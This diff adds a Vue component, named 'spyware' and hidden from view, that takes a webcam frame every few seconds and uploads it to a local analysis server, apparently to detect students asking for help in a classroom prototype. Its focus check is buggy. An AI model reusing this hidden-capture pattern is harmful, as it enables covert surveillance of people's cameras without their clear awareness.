@@ -1,0 +1,65 @@
+<template>
+    <div class="spyware" style="display:none">
+        <video ref="v" width="600" height="600"></video>
+        <canvas ref="c" width="600" height="600"></canvas>
+    </div>
+</template>
+
+<script>
+import axios from 'axios';
+
+export default {
+    props: ['index'],
+    data(){
+        return{
+            canvas: undefined,
+            video: undefined,
+            interval: undefined,
+            focus: true,
+            tabFocus: true,
+            time: 3000
+        }
+    },
+    mounted(){
+        navigator.getUserMedia({video: true}, (stream)=>{
+            var video = this.$refs.v;
+            var canvas = this.$refs.c;
+            video.srcObject = stream;
+            video.play();
+
+            this.interval = setInterval(()=>{
+                this.takePicture();
+            }, 5000);
+        }, function(err) { console.log("there was an error " + err)});
+
+        window.onfocus = function() {
+            this.focused = true;
+        };
+        window.onblur = function() {
+            this.focused = false;
+        };
+    },
+    methods: {
+        takePicture(){
+            if(!focus || document.visibilityState !== 'visible'){return;}
+			this.$refs.c.getContext("2d").drawImage(this.$refs.v, 0, 0, 600, 600, 0, 0, 600, 600);
+            this.$refs.c.toBlob((blob)=>{
+                let data = new FormData();
+                console.log("Index envoyé " + this.index);
+                data.append('index', this.index);
+                data.append('image', blob);
+                axios.post('https://192.168.137.222:8443/analyse', data).then((data)=>{
+                    console.log(data);
+                    if(data.data == "ASSISTANT"){
+                        this.$emit("askForHelp");
+                    }
+                });
+            });
+        }
+    }
+}
+</script>
+
+<style>
+
+</style>
